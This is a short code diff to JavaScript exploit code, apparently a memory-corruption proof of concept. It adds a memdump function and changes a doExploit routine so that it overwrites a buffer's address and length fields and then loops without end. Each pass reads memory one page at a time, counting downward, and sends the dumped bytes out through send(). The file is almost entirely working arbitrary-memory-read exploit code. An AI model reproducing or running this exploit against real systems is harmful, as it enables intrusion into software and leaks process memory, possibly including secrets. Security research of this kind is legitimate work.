@@ -25,6 +25,13 @@ if(onSwitch !== undefined) {
 	};
 }
 
+function memdump(lo, hi, temp, size) {
+	var data = new Array(size);
+	for(var i = 0; i < size; ++i)
+		data[i] = temp[i];
+	send('memdump', [lo.toString(16), hi.toString(16), data]);
+}
+
 log('Loaded');
 
 var rwbuf = new ArrayBuffer(0x1001 * 4);
@@ -114,11 +121,27 @@ function doExploit(buf, stale, temp) {
 	buf[5] = hi;
 	dumptemp(16);
 	log('!!!!!!!!!!!!');
-	lo = temp[4];
-	hi = temp[5];
-	buf[4] = lo;
-	buf[5] = hi;
-	dumptemp(128);
+	lo = (temp[4] & 0xFFFFF000) >>> 0;
+	hi = temp[5] >>> 0;
+	var ctr = 0;
+	while(true) {
+		buf[4] = lo;
+		buf[5] = hi;
+		buf[6] = 0x1000;
+		memdump(lo, hi, temp, 4096 >> 4);
+
+		if(lo == 0) {
+			hi -= 1;
+			lo = 0xFFFFF000 >>> 0;
+		} else {
+			lo = (lo - 0x1000) >>> 0;
+		}
+
+		/*if(ctr++ == 100) {
+			alert(1);
+			ctr = 0;
+		}*/
+	}
 }
 
 function doItAll() {
